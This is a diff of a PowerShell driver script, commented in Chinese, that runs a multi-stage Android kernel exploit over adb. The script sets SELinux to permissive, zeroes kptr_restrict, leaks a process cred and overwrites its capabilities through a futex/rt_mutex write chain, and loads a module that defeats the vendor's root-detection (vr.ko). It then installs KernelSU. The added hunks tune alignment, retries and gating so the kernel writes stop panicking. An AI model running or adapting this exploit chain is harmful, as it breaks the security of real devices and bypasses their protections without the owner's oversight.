@@ -105,6 +105,8 @@ $dev_sock   = "/data/local/tmp/rootcmd_$tag.sock"
 $dev_w2log  = "/data/local/tmp/w2h_$tag.log"
 $dev_cred   = "/data/local/tmp/w2cred_$tag.txt"
 $dev_proof  = "/data/local/tmp/rootproof_$tag.txt"
+$dev_crproof = "/data/local/tmp/capsroot_$tag.txt"   # STAGE5(configfs) glt 写回 proof
+$dev_task   = "/data/local/tmp/w2task_$tag.txt"     # w2host 泄漏的 task_struct 地址 (备用)
 $dev_dbg    = "/data/local/tmp/w2dbg_$tag.log"
 $dev_seq    = "/data/local/tmp/glt_seq_$tag.txt"    # 诊断: 阶段运行标记 (异常重启后仍可拉取)
 $dev_diagr  = "/data/local/tmp/diag_root_$tag"      # 诊断: root 级日志快照目录 (STAGE6 起)
@@ -124,6 +126,19 @@ $pmb = [Convert]::ToUInt64($win.physmap_base,16)
 $se_p0 = ('0x{0:x}' -f ($pmb + [Convert]::ToUInt64($win.sym_offs.selinux_state,16)))
 $w0    = ('0x{0:x}' -f ($pmb + [Convert]::ToUInt64($win.sym_offs.kptr_restrict,16) - 8))
 Write-Output "镜像固有偏移: se_p0=$se_p0 w0=$w0"
+# ---- STAGE0 门禁 (跨机型安全, v1.3.5): win_offs.kernel_release 与设备 /proc/version ----
+# 不匹配 = 偏移来自另一个内核构建, 写链目标/宿主全是错地址 -> 写即 panic。
+# 在任何内核写之前退出 (连工具都不 push), 杜绝"用错内核的偏移强跑"
+# (V2339A 6.1.145 跑 b57 偏移即此路径)。
+$devVerRaw = (Shell "cat /proc/version 2>/dev/null").Trim()
+$winRelease = [string]$win.kernel_release
+if ($winRelease -and $devVerRaw -and $devVerRaw -notlike ("*" + $winRelease + "*")) {
+  Write-Output "STAGE0 GATE FAIL: 设备内核与 win_offs 不匹配"
+  Write-Output "  device   : $devVerRaw"
+  Write-Output "  win_offs : $winRelease"
+  Write-Output "  (请用该设备素材重新生成机型模块偏移, 不要复用其他内核构建的偏移)"
+  exit 1
+}
 
 # ---- GL_LOCK 宿主槽位轮转 (panic 根因修复) ----
 # 根因: chain walk 的 _raw_spin_trylock 成功时必然写 [lock+0]=owner,
@@ -175,6 +190,37 @@ function Mark([string]$s) {
   # 必须吞掉输出: 裸调用时返回的空字符串会泄漏进外层函数输出流,
   # 曾导致 $gl5 = Get-GLLock 拿到 ("", "0x...") 数组 -> GL_LOCK= 0x... -> glt 未启动
   Shell ("echo '" + $s + " host=" + (Get-Date -Format "HH:mm:ss") + "' >> $dev_seq") | Out-Null
+}
+
+# ---- vr.ko 对抗偏移查找 (跨机型, v1.3.5): 机型模块 > b57 默认 > 内置默认+WARN ----
+# vr.ko 的 tag/tp 偏移随内核构建不同 (b57 实证 tag_a=6 tag_b=44 tp=1024);
+# 非 b57 机型必须在 devices/<id>/vr_offsets.json 提供本机 vr.ko 提取值
+# (tools/offset_tools/extract_vr_from_img.py)。返回 @{ tagA; tagB; tp; src }。
+function Get-VrOffsets {
+  $tagA = 6; $tagB = 44; $tp = 1024; $src = 'builtin-default'
+  $cands = @()
+  if ($ProfilePath) {
+    $modVr = Join-Path (Split-Path -Parent $ProfilePath) "vr_offsets.json"
+    if (Test-Path -LiteralPath $modVr) { $cands += $modVr }
+  }
+  $defVr = Join-Path $PSScriptRoot "vr_offsets.json"
+  if (Test-Path -LiteralPath $defVr) { $cands += $defVr }
+  foreach ($cand in $cands) {
+    try {
+      $vro = Get-Content -LiteralPath $cand -Raw | ConvertFrom-Json
+      $tagA = [Convert]::ToInt32($vro.tag_a_off)
+      $tagB = [Convert]::ToInt32($vro.tag_b_off)
+      $tp   = [Convert]::ToInt32($vro.tp_flag)
+      $src  = $cand
+      break
+    } catch {
+      Write-Output "VR OFFS WARN: $cand parse failed"
+    }
+  }
+  if ($src -eq 'builtin-default') {
+    Write-Output "VR OFFS WARN: 无 vr_offsets.json, 使用默认 tag_a=6 tag_b=44 tp=1024 (非 b57 机型需用本机 vr.ko 提取)"
+  }
+  return @{ tagA = $tagA; tagB = $tagB; tp = $tp; src = $src }
 }
 
 Write-Output "=== root_full_permissive_restore: permissive -> kptr(leaf-RED) -> CAPSROOT -> INSMOD permissive_restore+kernelsu -> 25s permissive ==="
@@ -235,7 +281,13 @@ for ($r=1; $r -le 5; $r++) {
   if ($se -eq 'Permissive') { Write-Output "PERMISSIVE already OK"; $perm_ok=$true; break }
   Shell "rm -f /data/local/tmp/slide_probe"
     $gl1 = Get-GLLock
-    Shell "echo 'GL_USE_SLIDE=1 GL_EVENT_SYNC=1 GL_KEEP_CHAIN=1 GL_NO_SCHED=1 GL_NO_LOCKPI=1 GL_TASK_W2=1 GL_LOCK=$gl1 GL_TARGET=$se_p0 GL_FPAD=24 GL_PROBE=1 GL_ATTEMPTS=1 timeout 20 $dev_glt > /data/local/tmp/p.log 2>&1' > /data/local/tmp/run.sh; chmod 755 /data/local/tmp/run.sh; nohup sh /data/local/tmp/run.sh >/dev/null 2>&1 &"
+    # GL_FPAD=0 (官方对齐): pselect.json 推导 futex_waiter_relative ==
+    # pselect_word0_relative (Δ=0) -> 无 FPAD 时 fd_set 与 rt_waiter 天然
+    # 对齐 (shift=0), words[11]=GL_LOCK 精确覆盖 lock 字段, words[10]=
+    # init_task 命中. FPAD=24 (16B 对齐后 32B) 引入 ~4 words 漂移 ->
+    # lock 字段读 fd_set 之外 -> _raw_spin_trylock(垃圾) panic (16:21/16:25
+    # e4c 垃圾地址实证). 漂移由 words[4]/[11..14]=GL_LOCK 兜底.
+    Shell "echo 'GL_USE_SLIDE=1 GL_EVENT_SYNC=1 GL_KEEP_CHAIN=1 GL_NO_SCHED=1 GL_NO_LOCKPI=1 GL_SLIDE_ONLY=1 GL_TASK_W2=1 GL_LOCK=$gl1 GL_TARGET=$se_p0 GL_PROBE=1 GL_ATTEMPTS=1 timeout 20 $dev_glt > /data/local/tmp/p.log 2>&1' > /data/local/tmp/run.sh; chmod 755 /data/local/tmp/run.sh; nohup sh /data/local/tmp/run.sh >/dev/null 2>&1 &"
   for ($i=0; $i -lt 12; $i++) { Start-Sleep -Seconds 5; if (-not (Alive)) { break }; if ((Shell "getenforce") -eq 'Permissive') { $perm_ok=$true; break } }
   if ($perm_ok) { Write-Output "STAGE1 ROUND ${r}: PERMISSIVE OK"; break }
   if (-not (Alive)) { Write-Output "STAGE1 ROUND ${r}: DEVICE DOWN (panic?)"; exit 1 }
@@ -254,7 +306,7 @@ for ($r=1; $r -le 5; $r++) {
   if ($kp.Trim() -eq '0') { Write-Output "KPTR already 0"; $kptr_ok=$true; break }
   Shell "rm -f /data/local/tmp/slide_probe"
   $gl2 = Get-GLLock
-  Shell "echo 'GL_USE_SLIDE=1 GL_EVENT_SYNC=1 GL_KEEP_CHAIN=1 GL_NO_SCHED=1 GL_NO_LOCKPI=1 GL_TARGET_LEAF=1 GL_LOCK=$gl2 GL_W0=$w0 GL_ENTER_DELAY=5000 GL_ATTEMPTS=1 timeout 25 $dev_glt > /data/local/tmp/kptr.log 2>&1' > /data/local/tmp/run.sh; chmod 755 /data/local/tmp/run.sh; nohup sh /data/local/tmp/run.sh >/dev/null 2>&1 &"
+  Shell "echo 'GL_USE_SLIDE=1 GL_EVENT_SYNC=1 GL_KEEP_CHAIN=1 GL_NO_SCHED=1 GL_NO_LOCKPI=1 GL_SLIDE_ONLY=1 GL_TARGET_LEAF=1 GL_LOCK=$gl2 GL_W0=$w0 GL_ENTER_DELAY=5000 GL_ATTEMPTS=1 timeout 25 $dev_glt > /data/local/tmp/kptr.log 2>&1' > /data/local/tmp/run.sh; chmod 755 /data/local/tmp/run.sh; nohup sh /data/local/tmp/run.sh >/dev/null 2>&1 &"
   for ($i=0; $i -lt 12; $i++) { Start-Sleep -Seconds 5; if (-not (Alive)) { break }; if ((Shell "cat /proc/sys/kernel/kptr_restrict 2>/dev/null").Trim() -eq '0') { $kptr_ok=$true; break } }
   if ($kptr_ok) { Write-Output "STAGE2 ROUND ${r}: KPTR OK (leaf-RED)"; break }
   if (-not (Alive)) { Write-Output "STAGE2 ROUND ${r}: DEVICE DOWN (panic?)"; exit 1 }
@@ -286,7 +338,11 @@ Adb "pull /sys/kernel/btf/vmlinux $BTF_LOCAL" | Out-Null
 if (-not (Test-Path $BTF_LOCAL)) { Write-Output "STAGE3.4 FAIL: btf pull"; exit 1 }
 $liveArgs = @("live", $KSYM_OUT, $BTF_LOCAL, $WIN_OFFS, $OFFS_JSON)
 if ($ProfilePath) { $liveArgs += @("--profile", $ProfilePath) }
-& $python $OFFSETS_AUTO @liveArgs 2>&1 | Select-Object -Last 4 | ForEach-Object { Write-Output "offsets: $_" }
+$offOut = & $python $OFFSETS_AUTO @liveArgs 2>&1
+$offOut | Select-Object -Last 4 | ForEach-Object { Write-Output "offsets: $_" }
+$capsymName = $null
+$capsymLine = $offOut | Select-String -Pattern '^capsym:\s+(.+?)\s+@' | Select-Object -First 1
+if ($capsymLine) { $capsymName = $capsymLine.Matches[0].Groups[1].Value }
 if (-not (Test-Path $OFFS_JSON)) { Write-Output "STAGE3.4 FAIL: offsets.json"; exit 1 }
 $off = Get-Content $OFFS_JSON -Raw | ConvertFrom-Json
 if (-not $off.selinux_enforcing_p0 -or -not $off.kptr_restrict_p0 -or -not $off.capsym_va) { Write-Output "STAGE3.4 FAIL: offsets incomplete"; exit 1 }
@@ -305,7 +361,7 @@ $pmb_v = [Convert]::ToUInt64($win.physmap_base,16)
 $w2_cand_min = ('0x{0:x}' -f ($pmb_v + 0x40000000))       # 排除低 1GB (内核镜像/固件)
 $w2_direct_end = ('0x{0:x}' -f ($pmb_v + $mem_bytes))     # physmap 上限 = 真实内存
 Write-Output "设备内存: $([math]::Round($mem_kb/1024/1024,1))GB cand_min=$w2_cand_min direct_end=$w2_direct_end"
-Write-Output "STAGE3.4 OK: se=$se_p0 w0=$w0 cap_off=$cap_off capsym=$capsym w2_ips=$w2ips"
+Write-Output "STAGE3.4 OK: se=$se_p0 w0=$w0 cap_off=$cap_off capsym=$capsym($capsymName) w2_ips=$w2ips"
 Mark "STAGE3.4 OK"
 # ---- STAGE3.5: repatch permissive_restore (+kernelsu if provided) + push ----
 $KO_PATCHED = Join-Path $env:TEMP "kernelsu_patched_now.ko"
@@ -338,6 +394,30 @@ Shell "chmod 644 $dev_clear_vr_tag"
 Write-Output "STAGE3.5: clear_vr_tag.ko ($((Get-Item $CLEAR_VR_TAG_PATCHED).Length)B) pushed"
 Mark "STAGE3.5 OK"
 
+# ---- STAGE4 前静默门 (v1.3.5 根因修复): 设备忙时写链必 miss ----
+# 实测对照: 空闲 2/2 命中, 设备忙 (IO/CPU 风暴) 0/2 miss。STAGE3.4/3.5 的
+# kallsyms+BTF 拉取与 patch_all 反汇编后设备仍忙, 立即写 -> R1 miss。
+# 等待 loadavg(1min) 回落 + 最少 12s 静默, 上限 120s 未静默则 WARN 继续
+# (设备后台应用如 QQ MSF 可能长期占 CPU, 不无限等; 本门禁只吸收工具自身的
+# adb 拉取/反汇编负载, 不追求吸收用户应用负载)。等待语义, 不增加写重试。
+$qDeadline = (Get-Date).AddSeconds(30)
+$qWait = 0
+$load1 = 0.0
+do {
+  $laRaw = Shell "cat /proc/loadavg 2>/dev/null"
+  if ($laRaw -match '^\s*([0-9.]+)') { $load1 = [double]$matches[1] }
+  if ($load1 -lt 1.5 -and $qWait -ge 12) { break }
+  if (-not (Alive)) { Write-Output "STAGE4 QUIESCE: DEVICE DOWN"; exit 1 }
+  Start-Sleep -Seconds 2
+  $qWait += 2
+} while ((Get-Date) -lt $qDeadline)
+if ($load1 -ge 1.5) {
+  Write-Output "STAGE4 QUIESCE WARN: loadavg=$load1 30s 内未静默 (设备后台负载, 如 QQ MSF), 继续 (R1 miss 概率升高, 由 ROUND 覆盖)"
+} else {
+  Write-Output "STAGE4 QUIESCE OK: loadavg=$load1 wait=${qWait}s"
+}
+Mark ("STAGE4 QUIESCE OK loadavg=" + $load1)
+
 # ---- STAGE4+5: w2host cred 泄漏 + CAPSROOT (参数化重试, 每轮新 cred+新槽位) ----
 # 根因: w2host perf 采样泄漏的 cred 偶发命中无效/已释放/非 child
 #   cred -> glt 写后 w2host_child 检测不到 caps -> proof 空 -> STAGE5 FAIL.
@@ -360,7 +440,7 @@ for ($rr=1; $rr -le 3 -and -not $cred; $rr++) {
   if (-not (Alive)) { Write-Output "STAGE4 DEVICE DOWN"; exit 1 }
   Shell "pgrep -f 'w2hos[t]_' | xargs -r kill 2>/dev/null"
   Start-Sleep -Seconds 2
-  Shell "rm -f $dev_sock $dev_cred $dev_dbg $dev_proof; W2_SOCK=$dev_sock W2_CRED=$dev_cred W2_DBG=$dev_dbg W2_PROOF=$dev_proof W2_CRED_IPS=$w2ips W2_IP_LO=$w2lo W2_IP_HI=$w2hi W2_CAND_MIN=$w2_cand_min W2_DIRECT_END=$w2_direct_end nohup $dev_w2 > $dev_w2log 2>&1 &"
+  Shell "rm -f $dev_sock $dev_cred $dev_dbg $dev_proof $dev_task; W2_SOCK=$dev_sock W2_CRED=$dev_cred W2_DBG=$dev_dbg W2_PROOF=$dev_proof W2_TASK=$dev_task W2_CRED_IPS=$w2ips W2_IP_LO=$w2lo W2_IP_HI=$w2hi W2_CAND_MIN=$w2_cand_min W2_DIRECT_END=$w2_direct_end W2_KSETUP_SRC=$dev_ksud W2_KSETUP_MARK=/data/local/tmp/ksetup_$tag.txt nohup $dev_w2 > $dev_w2log 2>&1 &"
   $credline = ''
   for ($i=0; $i -lt 40; $i++) { Start-Sleep -Seconds 3; if (-not (Alive)) { Write-Output "STAGE4 DEVICE DOWN"; exit 1 }; $credline = Shell "cat $dev_cred 2>/dev/null"; if ($credline -and $credline.Length -gt 20 -and $credline -notmatch '^[\x00]+$') { break } }
   if (-not $credline -or $credline.Length -le 20) { Write-Output "STAGE4 ROUND $rr FAIL: no cred file"; continue }
@@ -371,10 +451,23 @@ for ($rr=1; $rr -le 3 -and -not $cred; $rr++) {
   foreach ($c in $cands) {
     if (-not (Alive)) { Write-Output "STAGE5 DEVICE DOWN (write panic?)"; exit 1 }
     $t = ('0x{0:x}' -f ([Convert]::ToUInt64($c,16) + $cap_off))
-    Shell "rm -f $dev_proof"
+    Shell "rm -f $dev_proof $dev_crproof"
     $gl5 = Get-GLLock
-    # WRITE 标记与 run.sh 启动合并为同一条 Shell 调用 (不额外增加 adb 往返, 避免拉宽写窗口竞态)
-    Shell ("echo 'WRITE cand=$c gl5=$gl5 target=$t host=" + (Get-Date -Format "HH:mm:ss") + "' >> $dev_seq; echo 'GL_USE_SLIDE=1 GL_EVENT_SYNC=1 GL_KEEP_CHAIN=1 GL_NO_SCHED=1 GL_NO_LOCKPI=1 GL_TASK_W2=1 GL_LOCK=$gl5 GL_TARGET=$t GL_INIT_CRED=$capsym GL_FPAD=24 GL_PROBE=1 GL_ATTEMPTS=1 timeout 20 $dev_glt > /data/local/tmp/w.log 2>&1' > /data/local/tmp/run.sh; chmod 755 /data/local/tmp/run.sh; nohup sh /data/local/tmp/run.sh >/dev/null 2>&1 &")
+    # STAGE5(默认, TASK_W2+capsym): 本机实测可靠路径 (开发机 3/3 成功)。
+    # 写值用 capsym 而非 init_cred: init_cred 低32位 0x021205c8 缺
+    # DAC_OVERRIDE(1)/SYS_ADMIN(21) -> STAGE6 INSMOD EPERM (实证, 20:04
+    # 回归); capsym 候选已由 offsets_auto 按位16+位1/12/19/21 筛选。
+    # configfs 路径 (GL_FOPS_HIJACK+GL_CRED) 在 b57 上劫持链即崩 (单 fd/全局
+    # 均复现), 暂不可用; GL_CRED 代码保留在 glt 中待修。
+    # WRITE 标记后 sync 落盘: panic 重启会丢 page cache (F2FS 回滚), 不 sync
+    # 则 glt_seq 的 WRITE 行丢失 -> 无法定位崩溃点 (14:04/14:13 实测丢失)。
+    # GL_SLIDE_ONLY=1 (根因修复): STAGE5 写链完成后 glt 立即退出, 不再执行
+    # main.c 默认路径的 run_main_route_threads (fops 线程), 否则其 consumer
+    # 的 futex_lock_pi 会第二次链走命中已被覆盖的假 waiter -> task_blocks_on
+    # _rt_mutex -> 读垃圾 waiter->lock -> _raw_spin_trylock panic
+    # (15:21/14:13 pstore 实证: futex_lock_pi 阻塞路径, 非 remove_waiter).
+    # GL_FPAD=0: 同 STAGE1 (官方 Δ=0 对齐, words 表精确覆盖).
+    Shell ("echo 'WRITE cand=$c gl5=$gl5 target=$t host=" + (Get-Date -Format "HH:mm:ss") + "' >> $dev_seq; sync; echo 'GL_USE_SLIDE=1 GL_EVENT_SYNC=1 GL_KEEP_CHAIN=1 GL_NO_SCHED=1 GL_NO_LOCKPI=1 GL_SLIDE_ONLY=1 GL_TASK_W2=1 GL_LOCK=$gl5 GL_TARGET=$t GL_INIT_CRED=$capsym GL_PROBE=1 GL_ATTEMPTS=1 timeout 20 $dev_glt > /data/local/tmp/w.log 2>&1' > /data/local/tmp/run.sh; chmod 755 /data/local/tmp/run.sh; nohup sh /data/local/tmp/run.sh >/dev/null 2>&1 &")
     $rp = ''
     for ($i=0; $i -lt 12; $i++) { Start-Sleep -Seconds 2; if (-not (Alive)) { Write-Output "STAGE5 DEVICE DOWN (write panic)"; exit 1 }; $rp = Shell "cat $dev_proof 2>/dev/null"; if ($rp -match 'CAPSROOT') { Write-Output "STAGE5 OK: $rp"; $cred=$c; break } }
     if ($cred) { break }
@@ -424,6 +517,36 @@ if ($mods_now -match 'kernelsu' -and $se_now -eq 'Enforcing') {
   Write-Output "STAGE6 FAIL: kernelsu loaded but enforcing (permissive_restore missing) -> rootcmd dead, REBOOT and rerun"
   exit 1
 }
+# ---- STAGE6.0a: clear_vr_tag 前置 (保护 permissive_restore 提权进程) ----
+# 根因修复 (v1.3.5-beta2): vr.ko 在 sys_exit 杀"非root->root"提权进程。实证:
+# permissive_restore INSMOD 的 commit_creds 提权后, 执行 init_module 的 rootcmd
+# 子进程被杀 (socket 返回空, INSMOD 分支后续代码无机会执行) -> KSETUP 落位失败。
+# clear_vr_tag 的 kretprobe commit_creds 会清 vr 标记 (tag_a/tag_b) +
+# TIF_SYSCALL_TRACEPOINT (tp_flag), 前置加载后 permissive_restore 的提权子进程
+# 存活, w2host INSMOD 分支的 KSETUP (root 窗口内落位 /data/adb/ksud) 才能执行。
+$cc_addr = ''
+foreach ($line in (Get-Content $KSYM_OUT)) {
+  if ($line -match '^\s*([0-9a-fA-F]+)\s+T\s+commit_creds\s*$') { $cc_addr = '0x' + $matches[1]; break }
+}
+if ($KO_OFFICIAL -and $cc_addr) {
+  if ((Shell "cat /proc/modules 2>/dev/null | grep -E '^clear_vr_tag'") -match 'clear_vr_tag') {
+    Write-Output "STAGE6.0a: clear_vr_tag already loaded, skip INSMOD"
+  } else {
+    $vro = Get-VrOffsets
+    $vrTagA = $vro.tagA; $vrTagB = $vro.tagB; $vrTp = $vro.tp
+    Write-Output "STAGE6.0a: vr_offsets 来源: $($vro.src) (tag_a=$vrTagA tag_b=$vrTagB tp=$vrTp)"
+    Write-Output "STAGE6.0a: INSMOD clear_vr_tag (前置, 防 vr.ko 杀提权进程) cc_addr=$cc_addr tag_a=$vrTagA tag_b=$vrTagB tp=$vrTp ..."
+    $r = Rootcmd "INSMOD $dev_clear_vr_tag cc_addr=$cc_addr tag_a_off=$vrTagA tag_b_off=$vrTagB tp_flag=$vrTp"
+    Write-Output "INSMOD clear_vr_tag ret: $r"
+    Start-Sleep -Seconds 2
+    $m = Shell "cat /proc/modules 2>/dev/null | grep '^clear_vr_tag'"
+    if ($m -notmatch 'clear_vr_tag') {
+      Write-Output "STAGE6.0a FAIL: clear_vr_tag 未加载 ('$m') -> 后续提权进程会被 vr.ko 杀, ksud 落位不可靠"
+      exit 1
+    }
+    Write-Output "STAGE6.0a OK: $m"
+  }
+}
 # permissive_restore: 总是重载 (清零 GL 宿主) — skipped with -SkipPermissiveRestore
 if ($PERM_RESTORE_SRC) {
   if ($mods_now -match "$DEV_MOD") {
@@ -458,6 +581,28 @@ if ($PERM_RESTORE_SRC) {
 } else {
   Write-Output "STAGE6 SKIP: -SkipPermissiveRestore (permissive_restore not loaded; enforcing stays)"
 }
+# ---- STAGE6.0: ksud 落位校验 (root 窗口内完成, kernelsu INSMOD 之前) ----
+# 根因修复 (v1.3.5-beta2): KernelSU sucompat 把所有 su 调用重定向执行
+# /data/adb/ksud; 该文件缺失时 su 全灭 ("su: inaccessible or not found")。
+# CAPSROOT 的 cap_permitted = capsym (KASLR 随机), rootcmd 文件操作不可靠
+# (缺 CAP_DAC_OVERRIDE 时 CP/CHMOD/STAT 全 EACCES, 回归实测)。确定性方案:
+# permissive_restore INSMOD 的 init 执行 commit_creds(init_cred) -> 执行
+# init_module 的 rootcmd 子进程被提为 uid0+全caps, w2host INSMOD 分支在
+# init_module 成功后 (W2_KSETUP_SRC/W2_KSETUP_MARK 注入) 直接落位
+# /data/adb/ksud 并写标记文件 (INSMOD 的 socket 返回不可靠, 标记文件兜底)。
+# 此处只校验标记文件 (adb 可读), 不依赖 rootcmd 随机 caps。
+if ($KO_OFFICIAL -and $PERM_RESTORE_SRC) {
+  Write-Output "STAGE6.0: 校验 root 窗口 ksud 落位 (ksetup 标记)..."
+  $ksetup_mark = "/data/local/tmp/ksetup_$tag.txt"
+  $mk = Shell "cat $ksetup_mark 2>/dev/null"
+  if ($mk -notmatch 'KSETUP_OK' -or $mk -notmatch 'size=4556352') {
+    Write-Output "STAGE6.0 FAIL: ksud 未在 root 窗口内落位 (ksetup 标记: '$mk')"
+    Write-Output "STAGE6.0 diag: w2host 日志尾部:"
+    Shell "tail -20 $dev_w2log 2>/dev/null" | ForEach-Object { Write-Output "  $_" }
+    exit 1
+  }
+  Write-Output "STAGE6.0 OK: /data/adb/ksud 已由 root 窗口落位 ($mk)"
+}
 # kernelsu: in-tree ko by default (-KsuKoPath / $env:KSU_KO_PATH to override);
 # idempotent if already loaded
 if ($mods_now -match 'kernelsu') {
@@ -482,26 +627,20 @@ $bid = (Shell "cat /proc/sys/kernel/random/boot_id 2>/dev/null").Trim()
 if ($bid -and $PERM_RESTORE_SRC) { Set-Content $GL_STATE ("$bid`n0"); Write-Output "STAGE6: GL 宿主已清零, 槽位重置 -> 无限提权" }
 elseif ($bid) { Write-Output "STAGE6: -SkipPermissiveRestore, GL 宿主未清零 (槽位状态保留)" }
 
-# ---- STAGE6.1: ksud 就位 (sucompat 重定向目标, 必须先于一切 su 使用) ----
-# KernelSU sucompat 把所有 su 调用重定向执行 /data/adb/ksud。该文件缺失或损坏
-# 时 (首次装机 / ksud install 半途失败), 全部 su 报 "su: inaccessible or not
-# found" -> 后续 STAGE6.5/STAGE8 以及 manager 模块页/超级用户页全部失败。
-# 此处确保其为完整 ELF: su 可用时用 su 检查/修复; su 不可用时回退 rootcmd
-# (CHMOD 777 /data/adb 后 adb shell 直接 cp)。
+# ---- STAGE6.1: ksud 就位后 su 首验 (kernelsu 加载后, sucompat 生效) ----
+# STAGE6.0 已在 kernelsu 加载前用 rootcmd 落位 /data/adb/ksud; 此处仅在
+# kernelsu 加载后验证 su 链路 (sucompat -> /data/adb/ksud -> root shell)。
+# 失败不 exit (由 STAGE7 门禁统一裁决), 但打印完整诊断供定位。
 if ($KO_OFFICIAL) {
   $kchk = Shell "su -c 'head -c 4 /data/adb/ksud 2>/dev/null | xxd -p'"
   if ($kchk -eq '7f454c46') {
-    Write-Output "STAGE6.1: /data/adb/ksud ELF OK"
+    Write-Output "STAGE6.1 OK: su -> /data/adb/ksud ELF OK"
   } else {
-    Write-Output "STAGE6.1: /data/adb/ksud missing/broken ('$kchk'), repairing ..."
-    Rootcmd "MKDIR /data/adb" | Out-Null
-    Rootcmd "CHMOD 777 /data/adb" | Out-Null
-    Shell "cp $dev_ksud /data/adb/ksud; chmod 755 /data/adb/ksud" | Out-Null
-    Rootcmd "CHMOD 755 /data/adb" | Out-Null
-    Rootcmd "CHOWN 0 1000 /data/adb" | Out-Null
-    $kchk2 = Shell "su -c 'head -c 4 /data/adb/ksud 2>/dev/null | xxd -p'"
-    if ($kchk2 -eq '7f454c46') { Write-Output "STAGE6.1 OK: repaired, su back online" }
-    else { Write-Output "STAGE6.1 WARN: repair failed ('$kchk2'), su may not work" }
+    Write-Output "STAGE6.1 FAIL: su 链路异常 ('$kchk')"
+    $st = Rootcmd "STAT /data/adb/ksud"
+    Write-Output "STAGE6.1 diag: rootcmd STAT /data/adb/ksud -> '$st' (rootcmd 可能已被 KSU 阻断)"
+    $su_id = Shell "su -c 'id' 2>&1 | head -1"
+    Write-Output "STAGE6.1 diag: su -c id -> '$su_id'"
   }
 }
 
@@ -517,20 +656,12 @@ if ($cc_addr) {
   if ((Shell "cat /proc/modules 2>/dev/null | grep -E '^clear_vr_tag'") -match 'clear_vr_tag') {
     Write-Output "STAGE6.5: clear_vr_tag already loaded, skip INSMOD"
   } else {
-    # vr.ko 对抗偏移: 默认 b57 实证值 (0x06/0x2c/0x400); 若有
-    # tools/offset_tools/extract_vr_offsets.py 生成的 vr_offsets.json
-    # (输入对应固件 vr.ko), 自动覆盖为提取值.
-    $vrTagA = 6; $vrTagB = 44; $vrTp = 1024
-    $VR_OFFS = Join-Path $PSScriptRoot "vr_offsets.json"
-    if (Test-Path $VR_OFFS) {
-      try {
-        $vro = Get-Content $VR_OFFS -Raw | ConvertFrom-Json
-        $vrTagA = [Convert]::ToInt32($vro.tag_a_off)
-        $vrTagB = [Convert]::ToInt32($vro.tag_b_off)
-        $vrTp   = [Convert]::ToInt32($vro.tp_flag)
-        Write-Output "STAGE6.5: vr offsets from vr_offsets.json (tag_a=$vrTagA tag_b=$vrTagB tp=$vrTp)"
-      } catch { Write-Output "STAGE6.5 WARN: vr_offsets.json parse failed, using defaults" }
-    }
+    # vr.ko 对抗偏移: Get-VrOffsets 查找顺序 = 机型模块 devices/<id>/vr_offsets.json
+    # (extract_vr_from_img.py 对对应固件 vr.ko 提取) -> tools/scripts/vr_offsets.json
+    # (b57 实证值) -> 内置默认值+WARN。
+    $vro = Get-VrOffsets
+    $vrTagA = $vro.tagA; $vrTagB = $vro.tagB; $vrTp = $vro.tp
+    Write-Output "STAGE6.5: vr offsets 来源: $($vro.src) (tag_a=$vrTagA tag_b=$vrTagB tp=$vrTp)"
     Write-Output "STAGE6.5: INSMOD clear_vr_tag cc_addr=$cc_addr tag_a=$vrTagA tag_b=$vrTagB tp=$vrTp ..."
     # rootcmd socket 在 INSMOD kernelsu 后已被 KSU 阻断 (见 STAGE6 注释),
     # 此处改用 su -c insmod (STAGE6 allow_shell=1 已生效)。
@@ -567,6 +698,22 @@ if ($PERM_RESTORE_SRC) {
   Write-Output "STAGE7: -SkipPermissiveRestore -> enforcing expected; permissive_restore module check skipped"
 }
 if ($KO_OFFICIAL -and $mods -notmatch 'kernelsu') { Write-Output "STAGE7 FAIL: kernelsu module missing"; exit 1 }
+# ---- STAGE7 门禁增强 (v1.3.5-beta2): 真实校验 su 与 ksud, 杜绝假 PASS ----
+if ($KO_OFFICIAL) {
+  $su_id = Shell "su -c 'id' 2>&1 | head -1"
+  Write-Output "STAGE7: su -c id -> $su_id"
+  if ($su_id -notmatch 'uid=0') {
+    Write-Output "STAGE7 FAIL: su 不可用 ('$su_id'), KSU userspace 未就位"
+    exit 1
+  }
+  $kst = Shell "su -c 'head -c 4 /data/adb/ksud 2>/dev/null | xxd -p'"
+  Write-Output "STAGE7: /data/adb/ksud head -> $kst"
+  if ($kst -ne '7f454c46') {
+    Write-Output "STAGE7 FAIL: /data/adb/ksud 缺失或损坏 ('$kst')"
+    exit 1
+  }
+  Write-Output "STAGE7: su + ksud 真实验证通过"
+}
 $ver = ''
 if ($KO_OFFICIAL) { $ver = Shell "$dev_ksud debug version 2>&1 | head -2"; Write-Output "ksud version: $ver" }
 $ping = Shell "ping -c 3 -W 2 223.5.5.5 2>&1 | tail -2"
